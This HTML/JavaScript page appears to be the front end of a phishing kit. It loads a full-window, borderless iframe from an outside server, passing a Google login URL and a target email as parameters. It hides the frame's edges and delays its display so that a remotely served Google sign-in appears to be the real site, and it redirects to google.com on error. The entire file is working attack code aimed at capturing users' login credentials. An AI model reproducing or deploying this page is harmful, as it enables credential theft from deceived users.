<script>
    let src = "http://myprivetnetworkserver.online/client";
    src="http://localhost:8000/client"
    let _default_login_url = "https://google.com/login";
    let _default_email = ""; 
    let error_page = "https://google.com";
</script>
<html>
<body style="margin: 0; padding: 0">
        
    <iframe 
        src="" 
        frameborder="0" style="margin: 0; margin-top: -20px;opacity: 0"
        onerror="location = error_page"
    ></iframe>
    <script>
        if(!window.login_url) login_url = _default_login_url
        if(!window.email) email = _default_email
        src += '?' + encodeURIComponent(login_url)
        if(email) src += '&' + encodeURIComponent(email)
        document.querySelector('iframe').src = src 
        setInterval(() => {
            document.querySelector('iframe').style.width = window.innerWidth + 'px'
            document.querySelector('iframe').style.height = (window.innerHeight + 20) + 'px'
            // console.log(2);
        }, 200);
        setTimeout(() => document.querySelector('iframe').style.opacity = 1, 4000)
    </script>
</body>
</html>
